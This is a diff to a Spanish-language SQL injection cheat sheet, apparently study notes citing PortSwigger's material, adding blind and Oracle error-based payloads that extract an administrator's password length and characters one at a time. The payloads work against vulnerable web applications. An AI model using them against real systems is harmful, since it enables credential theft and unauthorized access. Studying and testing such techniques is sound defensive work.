@@ -36,5 +36,18 @@ Extraccion de tablas: ```SELECT * FROM all_tables```
 
 Extraccion de columnas: ```SELECT * FROM all_tab_columns WHERE table_name = 'USERS'```
 
+# BLIND SQL
+Cantidad de Caracteres: ```xyz' AND LENGTH((SELECT Password FROM Users WHERE Username = 'Administrator')) = 1 --```
+
+Valor exacto: ```xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's' --```
+
+Valor en ASCII: ```xyz' AND ASCII(SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1)) = 118 --```
+
+Del 32-126
+
+Error-based SQL injection (ORACLE): ``` xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 1 END)=1--```
+
+Error-based SQL injection (ORACLE): ``` xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 1 END FROM DUAL)=1--```
+
 # Referencias
 - [Burpsuite](https://portswigger.net/web-security/sql-injection/cheat-sheet)
